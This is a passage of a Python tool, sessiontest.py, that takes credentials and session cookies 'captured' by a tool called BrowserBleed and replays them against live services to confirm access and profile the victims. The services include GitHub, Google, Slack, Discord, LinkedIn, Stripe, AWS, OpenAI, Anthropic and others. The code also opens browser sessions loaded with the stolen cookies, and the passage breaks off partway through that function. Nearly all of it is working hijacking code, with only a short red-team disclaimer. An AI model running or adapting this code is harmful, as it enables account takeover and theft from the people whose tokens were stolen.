#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
sessiontest.py — Test captured BrowserBleed credentials against live services.

Reads bb_results.csv (output of BrowserBleed) and attempts to authenticate to
each identified service, reporting identity and access level.

Usage:
    python3 sessiontest.py                           # auto-finds bb_results.csv
    python3 sessiontest.py path/to/results.csv       # explicit file
    python3 sessiontest.py --browser results.csv     # also open cookie browser sessions
    python3 sessiontest.py --timeout 15              # per-request timeout (default 10s)
    python3 sessiontest.py --json                    # machine-readable output
    python3 sessiontest.py --no-verify-ssl           # skip TLS cert verification

Environment variables:
    BB_RESULTS_CSV=/path/to/results.csv             # explicit path (checked first)

For authorized red team use only.
"""

import argparse
import base64
import csv
import glob
import io
import json
import os
import ssl
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

try:
    from browser_sessions import open_authenticated_session, SELENIUM_AVAILABLE
except ImportError:
    SELENIUM_AVAILABLE = False
    open_authenticated_session = None

# ── ANSI colours ──────────────────────────────────────────────────────────────

def _colour(code: str, text: str) -> str:
    if not sys.stdout.isatty():
        return text
    return f"\033[{code}m{text}\033[0m"

green  = lambda t: _colour("32", t)
red    = lambda t: _colour("31", t)
yellow = lambda t: _colour("33", t)
cyan   = lambda t: _colour("36", t)
bold   = lambda t: _colour("1",  t)
dim    = lambda t: _colour("2",  t)

# ── HTTP helper ────────────────────────────────────────────────────────────────

_timeout = 10
_ssl_ctx = ssl.create_default_context()

def _get(url: str, headers: dict, *, body: bytes = None, method: str = "GET") -> tuple[int, dict]:
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=_timeout, context=_ssl_ctx) as r:
            raw = r.read()
            try:
                return r.status, json.loads(raw)
            except Exception:
                return r.status, {}
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
            return e.code, json.loads(body)
        except Exception:
            return e.code, {}
    except Exception as e:
        return 0, {"_error": str(e)}


def _status_only(url: str, headers: dict) -> int:
    """GET without following redirects — returns the bare first-hop HTTP status."""
    class _NoRedir(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, hdrs, newurl):
            return None
    handlers: list = [_NoRedir()]
    if url.startswith("https://"):
        handlers.append(urllib.request.HTTPSHandler(context=_ssl_ctx))
    opener = urllib.request.build_opener(*handlers)
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with opener.open(req, timeout=_timeout) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0

# ── JWT decode (no network) ───────────────────────────────────────────────────

def _b64pad(s: str) -> str:
    return s + "=" * (-len(s) % 4)

def _decode_jwt(token: str) -> dict | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(base64.urlsafe_b64decode(_b64pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(_b64pad(parts[1])))
        return {"header": header, "payload": payload}
    except Exception:
        return None

# ── Result structure ──────────────────────────────────────────────────────────

class Result:
    def __init__(self, service: str, label: str, value_preview: str,
                 status: str, identity: str, access: str, raw: dict = None):
        self.service       = service
        self.label         = label
        self.value_preview = value_preview
        self.status        = status   # "valid", "expired", "invalid", "error", "info"
        self.identity      = identity
        self.access        = access
        self.raw           = raw or {}

    def to_dict(self) -> dict:
        return {
            "service":       self.service,
            "label":         self.label,
            "value_preview": self.value_preview,
            "status":        self.status,
            "identity":      self.identity,
            "access":        self.access,
        }

# ── Testers ───────────────────────────────────────────────────────────────────

def test_github(value: str, label: str) -> Result:
    status, data = _get(
        "https://api.github.com/user",
        {"Authorization": f"Bearer {value}", "User-Agent": "sessiontest/1.0"},
    )
    if status == 200:
        login  = data.get("login", "?")
        name   = data.get("name") or login
        email  = data.get("email") or ""
        pub    = data.get("public_repos", 0)

        _, orgs = _get(
            "https://api.github.com/user/orgs",
            {"Authorization": f"Bearer {value}", "User-Agent": "sessiontest/1.0"},
        )
        org_names = [o.get("login", "") for o in (orgs if isinstance(orgs, list) else [])]

        _, repos = _get(
            "https://api.github.com/user/repos?type=private&per_page=1",
            {"Authorization": f"Bearer {value}", "User-Agent": "sessiontest/1.0"},
        )

        scopes_header = ""  # scopes come from response headers, not in data — best effort
        parts = [f"{pub} public repos"]
        if isinstance(repos, list) and repos:
            parts.append("private repos ✓")
        if org_names:
            parts.append("orgs: " + ", ".join(org_names[:3]))

        identity = f"{name} ({login})"
        if email:
            identity += f"  <{email}>"
        return Result("GitHub", label, value[:12] + "…", "valid",
                      identity, "  ".join(parts), data)
    if status == 401:
        return Result("GitHub", label, value[:12] + "…", "invalid",
                      "—", "token rejected (401)", data)
    return Result("GitHub", label, value[:12] + "…", "error",
                  "—", f"HTTP {status}", data)


def test_linkedin_li_at(value: str, label: str) -> Result:
    """Test a LinkedIn li_at cookie via redirect-check and try to fetch profile data."""
    cookie_val = value.partition("=")[2] if value.startswith("li_at=") else value
    jar = f"li_at={cookie_val}"
    headers = {"Cookie": jar, "User-Agent": _UA}

    status_auth = _status_only("https://www.linkedin.com/feed/", headers)
    status_anon = _status_only("https://www.linkedin.com/feed/", {"User-Agent": _UA})

    if status_auth == 200 and status_anon != 200:
        # Session is valid, try to get profile info via GraphQL
        identity = "authenticated user"
        access = "session active"

        # Try to fetch profile data from LinkedIn API endpoint
        graphql_status, graphql_data = _get(
            "https://www.linkedin.com/voyager/api/graphql",
            {**headers, "Content-Type": "application/json"},
            body=b'{"operationName":"me","variables":{},"query":"query me { me { localizedFirstName localizedLastName emailAddress } }"}',
            method="POST",
        )
        if graphql_status == 200 and isinstance(graphql_data, dict):
            included = graphql_data.get("included", [])
            if included and isinstance(included[0], dict):
                data = included[0].get("localizedFirstName", "")
                if data:
                    identity = data
                    access = f"LinkedIn session active  email verified:{graphql_data.get('data', {}).get('me', {}).get('emailAddress', '?')}"

        return Result("LinkedIn", label, value[:16] + "…", "valid",
                      identity, access, {})
    if status_auth == 0:
        return Result("LinkedIn", label, value[:16] + "…", "error", "—", "connection failed", {})
    return Result("LinkedIn", label, value[:16] + "…", "info",
                  "—", f"li_at cookie: HTTP {status_auth}/{status_anon} — auth inconclusive", {})


def test_twitter_auth_token(value: str, label: str) -> Result:
    """Test a Twitter/X auth_token cookie via redirect-check against /home."""
    cookie_val = value.partition("=")[2] if value.startswith("auth_token=") else value
    jar = f"auth_token={cookie_val}"
    status_auth = _status_only("https://x.com/home", {"Cookie": jar, "User-Agent": _UA})
    status_anon = _status_only("https://x.com/home", {"User-Agent": _UA})
    if status_auth == 200 and status_anon != 200:
        return Result("Twitter / X", label, value[:16] + "…", "valid",
                      "authenticated", f"auth_token → 200 vs {status_anon} without — session active", {})
    if status_auth == 0:
        return Result("Twitter / X", label, value[:16] + "…", "error", "—", "connection failed", {})
    return Result("Twitter / X", label, value[:16] + "…", "info",
                  "—", f"auth_token cookie: HTTP {status_auth}/{status_anon} — auth inconclusive", {})


def test_sendgrid(value: str, label: str) -> Result:
    """Test a SendGrid API key against /v3/user/profile."""
    status, data = _get(
        "https://api.sendgrid.com/v3/user/profile",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        username = data.get("username", "?")
        email    = data.get("email", "")
        identity = f"{username} <{email}>" if email else username
        return Result("SendGrid", label, value[:16] + "…", "valid",
                      identity, "SendGrid API key confirmed", data)
    stat = "invalid" if status in (401, 403) else "error"
    return Result("SendGrid", label, value[:16] + "…", stat, "—", f"HTTP {status}", data)


def test_discord(value: str, label: str) -> Result:
    """Test a Discord user token against /api/v10/users/@me and fetch guilds."""
    status, data = _get(
        "https://discord.com/api/v10/users/@me",
        {"Authorization": value, "User-Agent": _UA},
    )
    if status == 200:
        username = data.get("username", "?")
        disc     = data.get("discriminator", "")
        email    = data.get("email", "")
        tag      = f"{username}#{disc}" if disc and disc != "0" else username
        identity = f"{tag} <{email}>" if email else tag

        # Get additional info: Nitro type, bot status, badges
        access_parts = []
        if data.get("bot"):
            access_parts.append("bot account")
        if data.get("system"):
            access_parts.append("system account")

        # Nitro subscription type: 0=none, 1=nitro classic, 2=nitro
        nitro_type = data.get("premium_type", 0)
        if nitro_type == 1:
            access_parts.append("Nitro Classic")
        elif nitro_type == 2:
            access_parts.append("Nitro")

        # Get guild count
        guild_status, guild_data = _get(
            "https://discord.com/api/v10/users/@me/guilds",
            {"Authorization": value, "User-Agent": _UA},
        )
        guild_count = len(guild_data) if guild_status == 200 and isinstance(guild_data, list) else 0
        if guild_count > 0:
            access_parts.append(f"{guild_count} guilds")

        access = "  ".join(access_parts) if access_parts else "user account"
        return Result("Discord", label, value[:16] + "…", "valid",
                      identity, f"id:{data.get('id','?')}  verified:{data.get('verified','?')}  {access}", data)
    stat = "invalid" if status in (401, 403) else "error"
    return Result("Discord", label, value[:16] + "…", stat, "—", f"HTTP {status}", data)


def test_spotify(value: str, label: str) -> Result:
    """Test a Spotify access token against /v1/me and fetch follower/playlist data."""
    status, data = _get(
        "https://api.spotify.com/v1/me",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        name    = data.get("display_name") or data.get("id", "?")
        email   = data.get("email", "")
        product = data.get("product", "")
        identity = f"{name} <{email}>" if email else name

        access_parts = []

        # Plan type (free or premium)
        if product:
            access_parts.append(f"plan:{product}")

        # Follower count
        followers = data.get("followers", {})
        if isinstance(followers, dict):
            follower_count = followers.get("total", 0)
            if follower_count > 0:
                access_parts.append(f"{follower_count} followers")

        # Get playlist count
        playlist_status, playlist_data = _get(
            "https://api.spotify.com/v1/me/playlists",
            {"Authorization": f"Bearer {value}"},
        )
        if playlist_status == 200 and isinstance(playlist_data, dict):
            playlist_count = playlist_data.get("total", 0)
            if playlist_count > 0:
                access_parts.append(f"{playlist_count} playlists")

        access = "  ".join(access_parts) if access_parts else "Spotify access confirmed"
        return Result("Spotify", label, value[:14] + "…", "valid",
                      identity, access, data)
    stat = "expired" if status == 401 else ("invalid" if status == 403 else "error")
    return Result("Spotify", label, value[:14] + "…", stat, "—", f"HTTP {status}", data)


def test_microsoft(value: str, label: str) -> Result:
    """Test a Microsoft token against the Graph /me endpoint."""
    status, data = _get(
        "https://graph.microsoft.com/v1.0/me",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        name  = data.get("displayName", "?")
        email = data.get("mail") or data.get("userPrincipalName", "")
        identity = f"{name} <{email}>" if email else name
        return Result("Microsoft", label, value[:16] + "…", "valid",
                      identity, "Microsoft Graph /me access confirmed", data)
    err = data.get("error", {})
    msg = (err.get("message") if isinstance(err, dict) else str(err)) or f"HTTP {status}"
    stat = "invalid" if status in (401, 403) else "error"
    return Result("Microsoft", label, value[:16] + "…", stat, "—", msg[:80], data)


def test_google_session_id(value: str, label: str) -> Result:
    """Try a captured Google session ID as an SID cookie (best-effort redirect check)."""
    jar = f"SID={value}"
    status_auth = _status_only("https://myaccount.google.com/", {"Cookie": jar, "User-Agent": _UA})
    status_anon = _status_only("https://myaccount.google.com/", {"User-Agent": _UA})
    if status_auth == 200 and status_anon != 200:
        return Result("Google", label, value[:16] + "…", "valid",
                      "authenticated", f"SID cookie → 200 vs {status_anon} without — session active", {})
    return Result("Google", label, value[:16] + "…", "info",
                  "—", f"SID cookie attempt: HTTP {status_auth}/{status_anon} — auth inconclusive", {})


def test_linkedin_session_id(value: str, label: str) -> Result:
    """Try a LinkedIn session ID as li_at then JSESSIONID cookie (best-effort)."""
    for cookie_name in ("li_at", "JSESSIONID"):
        jar = f"{cookie_name}={value}"
        headers = {"Cookie": jar, "User-Agent": _UA}
        status_auth = _status_only("https://www.linkedin.com/feed/", headers)
        status_anon = _status_only("https://www.linkedin.com/feed/", {"User-Agent": _UA})
        if status_auth == 200 and status_anon != 200:
            identity = f"authenticated user ({cookie_name})"
            access = f"{cookie_name} cookie — LinkedIn session active"

            # Try to get profile data if it's li_at (main auth cookie)
            if cookie_name == "li_at":
                graphql_status, graphql_data = _get(
                    "https://www.linkedin.com/voyager/api/graphql",
                    {**headers, "Content-Type": "application/json"},
                    body=b'{"operationName":"me","variables":{},"query":"query me { me { localizedFirstName localizedLastName } }"}',
                    method="POST",
                )
                if graphql_status == 200 and isinstance(graphql_data, dict):
                    included = graphql_data.get("included", [])
                    if included and isinstance(included[0], dict):
                        fname = included[0].get("localizedFirstName", "")
                        if fname:
                            identity = fname

            return Result("LinkedIn", label, value[:16] + "…", "valid",
                          identity, access, {})
    return Result("LinkedIn", label, value[:16] + "…", "info",
                  "—", "li_at/JSESSIONID attempts inconclusive — may need full cookie jar", {})


def test_anthropic_session(value: str, label: str) -> Result:
    """Test a claude.ai web session token (NextAuth __Secure-next-auth.session-token cookie)."""
    status, data = _get(
        "https://claude.ai/api/auth/session",
        {"Cookie": f"__Secure-next-auth.session-token={value}", "User-Agent": _UA},
    )
    if status == 200 and isinstance(data, dict) and data.get("user"):
        user     = data["user"]
        email    = user.get("email", "?")
        name     = user.get("name") or ""
        identity = f"{name} <{email}>" if name else email
        return Result("Anthropic", label, value[:16] + "…", "valid",
                      identity, "claude.ai session active", data)
    stat = "expired" if status in (401, 403) else ("invalid" if status else "error")
    return Result("Anthropic", label, value[:16] + "…", stat, "—", f"HTTP {status}", data)


def test_google_sapisid(value: str, label: str) -> Result:
    """Test a Google SAPISID cookie against myaccount.google.com via redirect-check."""
    if "=" in value:
        _, _, cookie_val = value.partition("=")
    else:
        cookie_val = value
    jar = f"SAPISID={cookie_val}"
    status_auth = _status_only("https://myaccount.google.com/", {"Cookie": jar, "User-Agent": _UA})
    status_anon = _status_only("https://myaccount.google.com/", {"User-Agent": _UA})
    if status_auth == 200 and status_anon != 200:
        return Result("Google", label, value[:20] + "…", "valid",
                      "authenticated",
                      f"200 with SAPISID vs {status_anon} without — session active", {})
    if status_auth == 0:
        return Result("Google", label, value[:20] + "…", "error", "—", "connection failed", {})
    return Result("Google", label, value[:20] + "…", "info",
                  "—", f"HTTP {status_auth}/{status_anon} — cannot confirm SAPISID session", {})


def test_google_oauth(value: str, label: str) -> Result:
    status, data = _get(
        "https://www.googleapis.com/oauth2/v3/userinfo",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        email = data.get("email", "?")
        name  = data.get("name", "")
        identity = f"{name} <{email}>" if name else email
        return Result("Google", label, value[:12] + "…", "valid",
                      identity, "OAuth userinfo readable", data)

    # Try tokeninfo for scope info
    status2, data2 = _get(
        f"https://oauth2.googleapis.com/tokeninfo?access_token={urllib.parse.quote(value)}",
        {},
    )
    if status2 == 200:
        email    = data2.get("email") or ""
        azp      = data2.get("azp") or data2.get("aud") or ""
        identity = email or (f"app:{azp[:30]}" if azp else "—")
        scope    = data2.get("scope", "")
        exp      = data2.get("expires_in", "?")
        access   = f"scope: {scope[:80]}  expires_in: {exp}s"
        return Result("Google", label, value[:12] + "…", "valid",
                      identity, access, data2)

    err = data.get("error_description") or data.get("error") or f"HTTP {status}"
    stat = "expired" if "expired" in str(err).lower() else "invalid"
    return Result("Google", label, value[:12] + "…", stat, "—", err, data)


def test_slack(value: str, label: str) -> Result:
    status, data = _get(
        "https://slack.com/api/auth.test",
        {"Authorization": f"Bearer {value}", "Content-Type": "application/json"},
        body=b"{}",
        method="POST",
    )
    if status == 200 and data.get("ok"):
        user     = data.get("user", "?")
        team     = data.get("team", "?")
        team_url = data.get("url", "")
        return Result("Slack", label, value[:14] + "…", "valid",
                      f"{user} @ {team}", team_url, data)
    err = data.get("error", f"HTTP {status}")
    stat = "expired" if err in ("token_revoked", "token_expired") else "invalid"
    return Result("Slack", label, value[:14] + "…", stat, "—", err, data)


def test_anthropic(value: str, label: str) -> Result:
    status, data = _get(
        "https://api.anthropic.com/v1/models",
        {"x-api-key": value, "anthropic-version": "2023-06-01"},
    )
    if status == 200:
        models = [m.get("id", "") for m in data.get("data", [])[:3]]
        return Result("Anthropic", label, value[:16] + "…", "valid",
                      "API key accepted", "models: " + ", ".join(models), data)
    err = data.get("error", {})
    msg = (err.get("message") if isinstance(err, dict) else str(err)) or f"HTTP {status}"
    stat = "invalid" if status in (401, 403) else "error"
    return Result("Anthropic", label, value[:16] + "…", stat, "—", msg[:80], data)


def test_openai(value: str, label: str) -> Result:
    status, data = _get(
        "https://api.openai.com/v1/models",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        models = [m.get("id", "") for m in data.get("data", [])[:3]]
        return Result("OpenAI", label, value[:14] + "…", "valid",
                      "API key accepted", "models: " + ", ".join(models), data)
    err = data.get("error", {})
    msg = (err.get("message") if isinstance(err, dict) else str(err)) or f"HTTP {status}"
    stat = "invalid" if status in (401, 403) else "error"
    return Result("OpenAI", label, value[:14] + "…", stat, "—", msg[:80], data)


def test_huggingface(value: str, label: str) -> Result:
    status, data = _get(
        "https://huggingface.co/api/whoami-v2",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        name  = data.get("name", "?")
        email = data.get("email", "")
        orgs  = [o.get("name", "") for o in data.get("orgs", [])[:3]]
        access_str = "orgs: " + ", ".join(orgs) if orgs else "no orgs"
        identity = f"{name} <{email}>" if email else name
        return Result("HuggingFace", label, value[:12] + "…", "valid",
                      identity, access_str, data)
    stat = "invalid" if status in (401, 403) else "error"
    return Result("HuggingFace", label, value[:12] + "…", stat, "—", f"HTTP {status}", data)


def test_stripe(value: str, label: str) -> Result:
    status, data = _get(
        "https://api.stripe.com/v1/account",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        acct_id    = data.get("id", "?")
        email      = data.get("email", "")
        biz_name   = data.get("business_profile", {}).get("name", "")
        livemode   = data.get("livemode", False)
        mode       = "LIVE" if livemode else "test"
        identity   = email or acct_id
        if biz_name:
            identity = f"{biz_name} ({identity})"
        return Result("Stripe", label, value[:16] + "…", "valid",
                      identity, f"account {acct_id}  mode={mode}", data)
    err = data.get("error", {})
    msg = (err.get("message") if isinstance(err, dict) else str(err)) or f"HTTP {status}"
    stat = "invalid" if status in (401, 403) else "error"
    return Result("Stripe", label, value[:16] + "…", stat, "—", msg[:80], data)


def test_npm(value: str, label: str) -> Result:
    status, data = _get(
        "https://registry.npmjs.org/-/whoami",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        username = data.get("username", "?")
        return Result("npm", label, value[:16] + "…", "valid",
                      username, "registry access confirmed", data)
    stat = "invalid" if status in (401, 403) else "error"
    return Result("npm", label, value[:16] + "…", stat, "—", f"HTTP {status}", data)


def test_jwt(value: str, label: str, service: str) -> Result:
    decoded = _decode_jwt(value)
    if not decoded:
        return Result(service or "JWT", label, value[:20] + "…", "error",
                      "—", "could not decode", {})
    payload = decoded["payload"]
    now = time.time()
    exp = payload.get("exp")
    iat = payload.get("iat")

    if exp:
        remaining = exp - now
        if remaining < 0:
            age = int(-remaining)
            time_str = f"expired {age//3600}h{(age%3600)//60}m ago"
            stat = "expired"
        else:
            time_str = f"valid for {int(remaining//3600)}h{int(remaining%3600)//60}m"
            stat = "valid"
    else:
        time_str = "no expiry"
        stat = "info"

    identity_parts = []
    for key in ("sub", "email", "preferred_username", "unique_name", "upn"):
        if payload.get(key):
            identity_parts.append(str(payload[key]))
            break

    access_parts = [time_str]
    for key in ("iss", "aud"):
        val = payload.get(key)
        if val:
            if isinstance(val, list):
                val = val[0]
            access_parts.append(f"{key}={str(val)[:40]}")

    svc = service or payload.get("iss", "JWT")
    preview = value[:20] + "…" if len(value) > 20 else value
    return Result(svc, label, preview, stat,
                  ", ".join(identity_parts) or "—",
                  "  ".join(access_parts), decoded)


def test_aws(access_key: str, secret_key: str, label: str) -> Result:
    """Sign a STS GetCallerIdentity request with SigV4."""
    import hashlib
    import hmac as _hmac
    import xml.etree.ElementTree as ET
    from datetime import datetime, timezone

    dt   = datetime.now(timezone.utc)
    date = dt.strftime("%Y%m%d")
    amz  = dt.strftime("%Y%m%dT%H%M%SZ")
    region = "us-east-1"
    svc_name = "sts"
    host = "sts.amazonaws.com"
    body = b"Action=GetCallerIdentity&Version=2011-06-15"

    def sign(key: bytes, msg: str) -> bytes:
        return _hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()

    body_hash      = hashlib.sha256(body).hexdigest()
    canon_headers  = f"content-type:application/x-www-form-urlencoded\nhost:{host}\nx-amz-date:{amz}\n"
    signed_headers = "content-type;host;x-amz-date"
    canon_req = "\n".join(["POST", "/", "", canon_headers, signed_headers, body_hash])
    string_to_sign = "\n".join([
        "AWS4-HMAC-SHA256", amz,
        f"{date}/{region}/{svc_name}/aws4_request",
        hashlib.sha256(canon_req.encode()).hexdigest(),
    ])
    k_signing = sign(sign(sign(sign(b"AWS4" + secret_key.encode(), date), region), svc_name), "aws4_request")
    sig = _hmac.new(k_signing, string_to_sign.encode(), hashlib.sha256).hexdigest()

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "x-amz-date": amz,
        "Authorization": (
            f"AWS4-HMAC-SHA256 Credential={access_key}/{date}/{region}/{svc_name}/aws4_request,"
            f" SignedHeaders={signed_headers}, Signature={sig}"
        ),
    }
    req = urllib.request.Request(f"https://{host}/", data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=_timeout, context=_ssl_ctx) as r:
            xml_bytes = r.read()
        root   = ET.fromstring(xml_bytes)
        ns     = {"s": "https://sts.amazonaws.com/doc/2011-06-15/"}
        result = root.find(".//s:GetCallerIdentityResult", ns)
        arn     = result.find("s:Arn",     ns).text if result is not None else "?"
        account = result.find("s:Account", ns).text if result is not None else "?"
        user_id = result.find("s:UserId",  ns).text if result is not None else "?"
        return Result("AWS", label, access_key[:16] + "…", "valid",
                      arn, f"account {account}  userId {user_id}", {})
    except urllib.error.HTTPError as e:
        stat = "invalid" if e.code in (401, 403) else "error"
        return Result("AWS", label, access_key[:16] + "…", stat, "—", f"HTTP {e.code}", {})
    except Exception as e:
        return Result("AWS", label, access_key[:16] + "…", "error", "—", str(e)[:80], {})


def _test_generic_cookie_session(domain: str, cookies: list[dict], jar: str, cookie_names: str) -> Result:
    """
    Fallback for domains not in _DOMAIN_TESTS.
    Compares first-hop status with vs. without cookies: if authenticated users get
    a direct 200 while unauthenticated users are redirected, the session is active.
    """
    base_url = f"https://{domain.lstrip('.')}/"
    status_anon = _status_only(base_url, {"User-Agent": _UA})
    status_auth = _status_only(base_url, {"Cookie": jar, "User-Agent": _UA})

    if status_auth == 200 and status_anon in (301, 302, 303, 307, 308):
        return Result(domain, "Cookie session", cookie_names, "valid",
                      "authenticated",
                      f"200 with cookies vs {status_anon} without — session active", {})
    if status_auth == 0:
        return Result(domain, "Cookie session", cookie_names, "error",
                      "—", "connection failed", {})
    return Result(domain, "Cookie session", cookie_names, "info",
                  "—",
                  f"{len(cookies)} cookie(s) — HTTP {status_auth}/{status_anon} (use --browser to verify)", {})


def test_cookie_session(domain: str, cookies: list[dict], *, browser: bool) -> list[Result]:
    """
    Test cookie session for a domain.
    cookies: list of {"name": ..., "value": ...}
    """
    results = []
    jar = "; ".join(f"{c['name']}={c['value']}" for c in cookies)
    cookie_names = ", ".join(c["name"] for c in cookies[:6])
    if len(cookies) > 6:
        cookie_names += f" +{len(cookies)-6} more"

    known = _DOMAIN_TESTS.get(domain) or _DOMAIN_TESTS.get(_strip_sub(domain))
    if known:
        url      = known[0]
        key_cookie = known[1]
        opts     = known[2] if len(known) > 2 else {}

        has_key = any(c["name"] == key_cookie for c in cookies)
        if not has_key:
            results.append(Result(domain, "Cookie session", cookie_names, "info",
                                  "—", f"{len(cookies)} cookie(s) — auth cookie '{key_cookie}' not present", {}))
        elif opts.get("no_redirect"):
            status_auth = _status_only(url, {"Cookie": jar, "User-Agent": _UA})
            status_anon = _status_only(url, {"User-Agent": _UA})
            if status_auth == 200 and status_anon != 200:
                results.append(Result(domain, "Cookie session", cookie_names, "valid",
                                      "authenticated",
                                      f"200 with cookies vs {status_anon} without — session active", {}))
            elif status_auth == 200:
                results.append(Result(domain, "Cookie session", cookie_names, "info",
                                      "—", "200 with and without cookies — cannot confirm session", {}))
            else:
                stat = "invalid" if status_auth in (301, 302, 303, 307, 308) else "error"
                results.append(Result(domain, "Cookie session", cookie_names, stat,
                                      "—", f"HTTP {status_auth} — redirected to login", {}))
        else:
            headers = {"Cookie": jar, "User-Agent": _UA}
            if opts.get("method") == "POST":
                headers["Content-Type"] = "application/json"
            status, data = _get(url, headers,
                                 body=opts.get("body"),
                                 method=opts.get("method", "GET"))
            if status == 200 and (not isinstance(data, dict) or data.get("ok") is not False):
                identity, access = _parse_cookie_identity(domain, data)
                results.append(Result(domain, "Cookie session", cookie_names, "valid",
                                      identity, access, data))
            else:
                err = ""
                if isinstance(data, dict):
                    err = str(data.get("error") or data.get("message") or f"HTTP {status}")
                else:
                    err = f"HTTP {status}"
                stat = "invalid" if status in (401, 403) else "error"
                results.append(Result(domain, "Cookie session", cookie_names, stat,
                                      "—", err[:80], data))
    else:
        results.append(_test_generic_cookie_session(domain, cookies, jar, cookie_names))

    if browser:
        _open_browser_session(domain, cookies)

    return results


_UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124 Safari/537.36"

# domain → (test_url, key_cookie, opts)
# opts keys:
#   no_redirect (bool) — compare 200-vs-redirect rather than parsing JSON
#   method (str), body (bytes) — for POST API endpoints
_DOMAIN_TESTS: dict[str, tuple] = {
    # GitHub: API rejects web cookies; use web endpoint + redirect check
    "github.com":           ("https://github.com/settings",                       "user_session",  {"no_redirect": True}),
    ".github.com":          ("https://github.com/settings",                       "user_session",  {"no_redirect": True}),
    # Google: OAuth userinfo needs a Bearer token; myaccount redirect-checks the web session
    "accounts.google.com":  ("https://myaccount.google.com/",                     "SAPISID",       {"no_redirect": True}),
    ".google.com":          ("https://myaccount.google.com/",                     "SAPISID",       {"no_redirect": True}),
    # Slack: d cookie IS the token — auth.test POST accepts it directly
    "app.slack.com":        ("https://slack.com/api/auth.test",                   "d",             {"method": "POST", "body": b"{}"}),
    ".slack.com":           ("https://slack.com/api/auth.test",                   "d",             {"method": "POST", "body": b"{}"}),
    # Discord: auth token lives in localStorage not cookies; redirect-check is best effort
    "discord.com":          ("https://discord.com/channels/@me",                  "__dcfduid",     {"no_redirect": True}),
    ".discord.com":         ("https://discord.com/channels/@me",                  "__dcfduid",     {"no_redirect": True}),
    # Twitter/X: OAuth API rejects web cookies; redirect-check the web session
    "twitter.com":          ("https://twitter.com/home",                          "auth_token",    {"no_redirect": True}),
    ".twitter.com":         ("https://twitter.com/home",                          "auth_token",    {"no_redirect": True}),
    "x.com":                ("https://x.com/home",                                "auth_token",    {"no_redirect": True}),
    ".x.com":               ("https://x.com/home",                                "auth_token",    {"no_redirect": True}),
    # LinkedIn: li_at is the session cookie; /feed/ redirects to login when unauthenticated
    "linkedin.com":         ("https://www.linkedin.com/feed/",                    "li_at",         {"no_redirect": True}),
    ".linkedin.com":        ("https://www.linkedin.com/feed/",                    "li_at",         {"no_redirect": True}),
    "www.linkedin.com":     ("https://www.linkedin.com/feed/",                    "li_at",         {"no_redirect": True}),
    # Reddit: /settings/ requires login
    "reddit.com":           ("https://www.reddit.com/settings/",                  "token_v2",      {"no_redirect": True}),
    ".reddit.com":          ("https://www.reddit.com/settings/",                  "token_v2",      {"no_redirect": True}),
    "www.reddit.com":       ("https://www.reddit.com/settings/",                  "token_v2",      {"no_redirect": True}),
    # Notion: token_v2 cookie authenticates the API directly
    "notion.so":            ("https://www.notion.so/api/v3/loadUserContent",      "token_v2",      {"method": "POST", "body": b"{}"}),
    ".notion.so":           ("https://www.notion.so/api/v3/loadUserContent",      "token_v2",      {"method": "POST", "body": b"{}"}),
    "www.notion.so":        ("https://www.notion.so/api/v3/loadUserContent",      "token_v2",      {"method": "POST", "body": b"{}"}),
}

def _strip_sub(domain: str) -> str:
    """Turn api.github.com → .github.com for lookup."""
    parts = domain.lstrip(".").split(".")
    if len(parts) > 2:
        return "." + ".".join(parts[-2:])
    return domain

def _parse_cookie_identity(domain: str, data: dict) -> tuple[str, str]:
    if not isinstance(data, dict):
        return "authenticated", f"{domain} session valid"

    # Reddit /api/v1/me.json
    if "name" in data and "comment_karma" in data:
        karma = data.get("link_karma", 0) + data.get("comment_karma", 0)
        return data["name"], f"karma: {karma}"

    # LinkedIn voyager/api/me — firstName/lastName may be strings or {"text": ...} dicts
    if "miniProfile" in data:
        mp = data["miniProfile"]
        def _txt(v):
            return v.get("text", "") if isinstance(v, dict) else (v or "")
        name = f"{_txt(mp.get('firstName'))} {_txt(mp.get('lastName'))}".strip()
        return name or mp.get("publicIdentifier", "authenticated"), f"{domain} session valid"

    # Notion loadUserContent
    if "recordMap" in data:
        users = data.get("recordMap", {}).get("notion_user", {})
        if users:
            uval = next(iter(users.values()), {}).get("value", {})
            name  = uval.get("name", "")
            email = uval.get("email", "")
            return (name or email or "authenticated"), f"{domain} session valid"

    # Slack auth.test (ok + user + team)
    if data.get("ok") and "user" in data:
        user = data["user"]
        team = data.get("team", "")
        return (f"{user} @ {team}" if team else user), f"{domain} session valid"

    # Generic fallback
    for key in ("login", "username", "name", "email", "screen_name", "user", "handle"):
        if isinstance(data.get(key), str):
            return data[key], f"{domain} session valid"
    return "authenticated", f"{domain} session valid"


def _open_browser_session(domain: str, cookies: list[dict]):
    """Launch a Playwright browser with the captured cookies."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print(yellow(f"\n  [browser] pip install playwright && playwright install chromium"))
        return

    scheme = "https"
    url    = f"{scheme}://{domain.lstrip('.')}/"
    print(cyan(f"\n  [browser] Opening {url} with {len(cookies)} cookie(s)…"))
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        ctx     = browser.new_context()
        ctx.add_cookies([{
            "name":   c["name"],
            "value":  c["value"],
